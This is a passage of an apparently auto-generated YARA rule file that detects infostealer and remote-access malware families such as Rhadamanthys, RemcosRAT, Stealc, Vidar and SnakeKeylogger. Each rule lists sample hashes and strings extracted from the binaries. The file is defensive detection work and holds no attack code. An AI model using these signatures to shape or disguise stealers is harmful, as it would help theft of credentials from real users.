      $s7 = " GetBooleanConfig" fullword ascii /* score: '12.00'*/
      $s8 = "6GetSupportedConsoleEncoding" fullword ascii /* score: '12.00'*/
      $s9 = ":GetExceptionForLastWin32Error" fullword ascii /* score: '12.00'*/
      $s10 = "&GetRuntimeException" fullword ascii /* score: '12.00'*/
      $s11 = "2GetExceptionForWin32Error" fullword ascii /* score: '12.00'*/
      $s12 = "&GetAddressFromIndex@" fullword ascii /* score: '12.00'*/
      $s13 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '12.00'*/
      $s14 = "0TypeSystemContextFactory.WellKnownTypeExtensions" fullword ascii /* score: '10.00'*/
      $s15 = "8GetUnsignedForBagElementKind@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imphash__Rhadamanthys_signature__7bfcbc53d4c02bdedbc3a63219e5ed9f__120 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash2 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
   strings:
      $s1 = "<get_IsValidLocationForInliningXSystem.Threading.IThreadPoolWorkItem.Execute" fullword ascii /* score: '23.00'*/
      $s2 = "get_ProcessPath\"GetFolderPathCore<ExpandEnvironmentVariablesCore" fullword ascii /* score: '20.00'*/
      $s3 = "GetProcessPath&get_SystemDirectory4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '20.00'*/
      $s4 = "2WriteProcessMemory_Native" fullword ascii /* score: '15.00'*/
      $s5 = "ReadProcessMemor" fullword wide /* score: '15.00'*/
      $s6 = "\"TransferLocalWorkVGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread$ge" ascii /* score: '14.00'*/
      $s7 = "\"TransferLocalWorkVGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread$ge" ascii /* score: '14.00'*/
      $s8 = "FGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s9 = "<UnregisterCancellationCallback:get_InvokeMayRunArbitraryCode" fullword ascii /* score: '12.00'*/
      $s10 = "Serilog.Capturing.IsStructureValueSupported" fullword ascii /* score: '11.00'*/
      $s11 = "SpinLock ProcessorIdCache'" fullword ascii /* score: '11.00'*/
      $s12 = "VThrowNotSupportedException_UnwritableStream8ThrowObjectDisposedExceptionRThrowObjectDisposedException_StreamClosed2ThrowOutOfMe" ascii /* score: '10.00'*/
      $s13 = "kernel3" fullword wide /* score: '10.00'*/
      $s14 = ".CryptographicOperations" fullword ascii /* score: '9.00'*/
      $s15 = "GetNewTableSize@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__121 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash5 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash6 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash7 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash8 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s2 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s3 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
      $s4 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s5 = "runtime.addOneOpenDeferFrame.func1.1" fullword ascii /* score: '13.00'*/
      $s6 = "framepc" fullword ascii /* score: '11.00'*/
      $s7 = "runtime.inPersistentAlloc" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.(*maptype).reflexivekey" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.(*maptype).hashMightPanic" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.panicSlice3AlenU" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.goPanicSlice3AlenU" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.cfuncnameFromNameoff" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.fastrandinit" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.(*maptype).indirectkey" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*maptype).needkeyupdate" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_122 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash7 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash8 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s2 = "SetHashCode.InitializeCurrentThread" fullword ascii /* score: '13.00'*/
      $s3 = "FreeLibrary4GetFileAttributesExPrivate" fullword ascii /* score: '12.00'*/
      $s4 = "TryGetExport" fullword ascii /* score: '12.00'*/
      $s5 = "GetSystemTimeAsFileTim" fullword wide /* score: '12.00'*/
      $s6 = "GetSystemTimePreciseAsFileTim" fullword wide /* score: '12.00'*/
      $s7 = "6System.IConvertible.ToInt32@" fullword ascii /* score: '10.00'*/
      $s8 = "6System.IConvertible.ToInt64@" fullword ascii /* score: '10.00'*/
      $s9 = "6System.IConvertible.ToInt16@" fullword ascii /* score: '10.00'*/
      $s10 = "Could not find a comma, or the length between the previous token and the comma was zero (i.e., '0x,'etc.)" fullword wide /* score: '10.00'*/
      $s11 = ".DataMisalignedException" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__123 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash4 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash5 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash6 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash7 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash8 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash9 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s2 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.materializeGCProg" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.dodeltimer0" fullword ascii /* score: '10.00'*/
      $s5 = "runtime.modtimer" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.hasPrefix" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.resettimer" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.updateTimer0When" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.nobarrierWakeTime" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.addAdjustedTimers" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.clearDeletedTimers" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.checkTimers" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.siftupTimer" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.runtimer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.moveTimers" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphas_124 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash3 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash4 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash5 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash6 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash7 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash8 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash9 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash10 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
      hash11 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "TargetvM:System.Security.Cryptography.CryptoConfigForwarder.#cctor" fullword ascii /* score: '25.00'*/
      $s2 = "&InitCultureDataCore InitUserOverride$GetTimeFormatsCore@" fullword ascii /* score: '17.00'*/
      $s3 = "HTryGetDynamicGenericMethodComponents@" fullword ascii /* score: '12.00'*/
      $s4 = "FTryGetStaticGenericMethodComponents" fullword ascii /* score: '12.00'*/
      $s5 = "System.Numerics.INumberBase<System.UInt32>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s6 = "System.Numerics.INumberBase<System.UInt32>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s7 = " get_NumberFormat@" fullword ascii /* score: '9.00'*/
      $s8 = "GetName@" fullword ascii /* score: '9.00'*/
      $s9 = "get_Key@" fullword ascii /* score: '9.00'*/
      $s10 = "get_AMDesignator get_PMDesignator" fullword ascii /* score: '9.00'*/
      $s11 = "WriteLineD<get_Out>g__EnsureInitialized|26_0b<get_IsOutputRedirected>g__EnsureInitialized|36_0" fullword ascii /* score: '9.00'*/
      $s12 = "GetType@" fullword ascii /* score: '9.00'*/
      $s13 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s14 = "get_NaNSymbol4get_PositiveInfinitySymbol4get_NegativeInfinitySymbol\"get_PercentSymbol$get_PerMilleSymbol,get_CurrencyGroupSizes" ascii /* score: '9.00'*/
      $s15 = ",get_IsOutputRedirected" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219_imphash__Rhadamanthys_signature__a520fd20530cf0b0db6a6c3c8b88d11d__125 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash2 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash3 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash4 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash5 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash6 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash7 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash8 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash9 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
   strings:
      $s1 = "wrong medium type  but memory size  to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGet" ascii /* score: '29.00'*/
      $s2 = "dex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation canceledruntime.semacreaterunt" ascii /* score: '26.00'*/
      $s3 = "wrong medium type  but memory size  to non-Go memory , locked to threadCommandLineToArgvWCreateFileMappingWGetExitCodeProcessGet" ascii /* score: '23.00'*/
      $s4 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '22.00'*/
      $s5 = "tUserNameExWMB; allocated NetUserGetInfoProcess32NextWSetFilePointerTranslateNameWallocfreetracebad allocCountbad span statebad " ascii /* score: '19.00'*/
      $s6 = "gcControllerState.findRunnable: blackening not enabledno goroutines (main called runtime.Goexit) - deadlock!runtime: GetQueuedCo" ascii /* score: '19.00'*/
      $s7 = "FileAttributesWLookupAccountNameWRFS specific errorSetFileAttributesWSystemFunction036" fullword ascii /* score: '16.00'*/
      $s8 = "ableno message of desired typenotewakeup - double wakeupout of memory (stackalloc)persistentalloc: size == 0required key not ava" ascii /* score: '15.00'*/
      $s9 = "e busytoo many linkstoo many userswinapi error #work.full != 0  with GC prog" fullword ascii /* score: '15.00'*/
      $s10 = "casfrom_Gscanstatus:top gp->status is not in scan stategentraceback callback cannot be used with non-zero skipnewproc: function " ascii /* score: '14.00'*/
      $s11 = "CertGetCertificateChainFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeMB during sweep; swept SetEnvironmen" ascii /* score: '13.00'*/
      $s12 = " *( -  <  >  m=%: ???NaNPC=]:" fullword ascii /* score: '12.00'*/
      $s13 = "as _GCmarkterminationgentraceback cannot trace user goroutine on its own stackruntime:stoplockedm: g is not Grunnable or Gscanru" ascii /* score: '11.00'*/
      $s14 = "anfreedefer with d.fn != nilinitSpan: unaligned lengthinvalid request descriptorname not unique on networkno CSI structure avail" ascii /* score: '10.00'*/
      $s15 = "runtime.typestring" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__8f1b4058_RemcosRAT_signature__dacfee8b_126 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_8f1b4058.js, RemcosRAT(signature)_dacfee8b.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8f1b4058ea33988e80e1ca765d6054045b5da575b7678b7e79afb9957128760b"
      hash2 = "dacfee8b1805f6536369bf401c7104946429f2e68c4e7143b60d9153b23c7c76"
   strings:
      $s1 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s2 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s3 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s4 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s5 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s7 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s8 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s9 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s10 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s11 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s12 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s13 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s14 = "    // Get PDC configuration file from script context" fullword ascii /* score: '13.00'*/
      $s15 = "            + \"xmlns:xsd='http://www.w3.org/2001/XMLSchema' \"" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__91802a615b3a5c4bcc05bc5f66a5b219__127 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_91802a615b3a5c4bcc05bc5f66a5b219(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash).exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32687360.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_32cfff30.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_516d9dae.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_552543de.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_5840ea1c.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b4fd170f.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_b7b7d002.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_c3f26585.exe, Rhadamanthys(signature)_a520fd20530cf0b0db6a6c3c8b88d11d(imphash)_dd620aed.exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe, Vidar(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "7dcf3101452546647c0a3b55519db6ba479c7169067e35d8db41b8ff45028247"
      hash3 = "03fe53eff294a718d3a887e23e2e83c98c55e8b6b5654bbc6650400f011604ad"
      hash4 = "32687360fdc4dad7137f1937bd995ca4591cb65f8ca607fa48d1a394cc4a824b"
      hash5 = "32cfff30d6ed1f3395b8ffbc8319fad8723f71547364a6cde2faddb2b80b5b1d"
      hash6 = "516d9daee48799c22090e64835e99df3d6a6384e9305bfa90287486c4e9881be"
      hash7 = "552543dea61279d3a283976db9ef74cb33d9ab66aba5ac3bb6203ffbcf141206"
      hash8 = "5840ea1c615a9daee7648736117ddce1c7c6e2143bf3b971e6828989e094edc4"
      hash9 = "b4fd170f2d56421678f4743cba758fb69779b4bfd0f77202dbfc760d8ed1c8e5"
      hash10 = "b7b7d00276073da29572e3dee367869d603ec7f64080a8bf99a8226ece840375"
      hash11 = "c3f26585fd9cf218077198e642eabb9a8468f092d8a9138b43e7f68c832df64a"
      hash12 = "dd620aedd68431d93bf160121019e21774e7e4955f7be863486c5a699b1187c7"
      hash13 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
      hash14 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash15 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
      hash16 = "0eec336ef3b35dfae142ceb42443e8de490356b4bc81e358f10151832b1c75cc"
   strings:
      $s1 = "      <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true/pm</dpiAware> <!-- legacy -->" fullword ascii /* score: '25.00'*/
      $s2 = "      <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">permonitorv2,permonitor</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s3 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2017/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s4 = "      <!-- The ID below indicates application support for Windows 10 -->" fullword ascii /* score: '11.00'*/
      $s5 = "      <!-- The ID below indicates application support for Windows 8.1 -->" fullword ascii /* score: '11.00'*/
      $s6 = "runtime.newdefer.func1" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.float64frombits" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.funcPC" fullword ascii /* score: '10.00'*/
      $s9 = "runtime.freedefer.func1" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.totaldefersize" fullword ascii /* score: '10.00'*/
      $s11 = "runtime.newdefer.func2" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.deferArgs" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.testdefersizes" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.jmpdefer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.tracebackdefers" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7f46e341_RemcosRAT_signature__a8741f2d_RemcosRAT_signature__aa569300_128 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7f46e341.js, RemcosRAT(signature)_a8741f2d.js, RemcosRAT(signature)_aa569300.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7f46e341e906e3c3b4b9ce3748f426f27fd808d904a1fe2a0706c690e0613132"
      hash2 = "a8741f2d62f81c47812fd549d14aea8d5872afb9b9788d69c6f14d5bf6fc74ac"
      hash3 = "aa56930042a94ecc6a42c1c4bbeadaf03229d2ec81784476c790977be5fc0100"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                        ' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAF" ascii /* base64 encoded string '       ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAEAAAAAAAAAA" ascii /* base64 encoded string '       @       ' */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAF" ascii /* base64 encoded string '            ' */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                        ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAAAAEAAAE" ascii /* base64 encoded string '             @  ' */ /* score: '16.50'*/
